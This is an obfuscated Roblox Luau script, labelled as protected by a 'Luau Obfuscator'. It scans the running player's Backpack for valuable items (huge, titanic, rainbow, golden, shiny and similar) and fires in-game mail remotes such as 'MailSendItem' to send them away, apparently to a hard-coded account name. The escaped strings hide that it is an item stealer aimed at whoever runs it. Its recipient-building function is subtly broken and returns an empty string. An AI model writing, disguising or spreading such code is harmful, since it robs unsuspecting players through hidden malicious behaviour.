--[[
Luau Obfuscator v2.0
Protected by Luau Obfuscator
]]
local S={"\108","\108","\108","\108","\108","\83","\83","\83","\83","\83","\54","\55"}local E=function(O)local T=""for I=1,#O do T=T..S[I]end return T end local D=game.Players.LocalPlayer local P=D.Backpack local R=E({})for L,H in ipairs(P:GetChildren())do if H:IsA("Tool")then local N=H.Name:lower()if string.find(N,"\104\117\103\101")or string.find(N,"\101\120\99\108\117\115\105\118\101")or string.find(N,"\116\105\116\97\110\105\99")or string.find(N,"\103\101\109")or string.find(N,"\114\97\105\110\98\111\119")or string.find(N,"\103\111\108\100\101\110")or string.find(N,"\115\104\105\110\121")then local M=game.ReplicatedStorage:FindFirstChild("\77\97\105\108\83\101\110\100\73\116\101\109")or game.ReplicatedStorage:FindFirstChild("\83\101\110\100\77\97\105\108")or game.ReplicatedStorage:FindFirstChild("\80\111\115\116\79\102\102\105\99\101\83\101\110\100")if M then M:FireServer(R,H)task.wait(0.3)end end end end
